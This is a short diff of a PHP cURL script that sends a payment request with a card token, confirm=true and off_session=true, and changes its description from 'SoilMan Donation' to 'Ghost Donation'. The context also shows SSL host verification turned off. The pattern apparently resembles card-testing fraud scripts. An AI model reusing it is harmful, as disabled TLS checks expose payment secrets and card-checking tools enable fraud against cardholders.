@@ -110,7 +110,7 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 
 curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=usd&payment_method_types[]=card&description=SoilMan Donation&payment_method='.$tok1.'&confirm=true&off_session=true');  
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=usd&payment_method_types[]=card&description=Ghost Donation&payment_method='.$tok1.'&confirm=true&off_session=true');  
 
 $result2 = curl_exec($ch);  
 
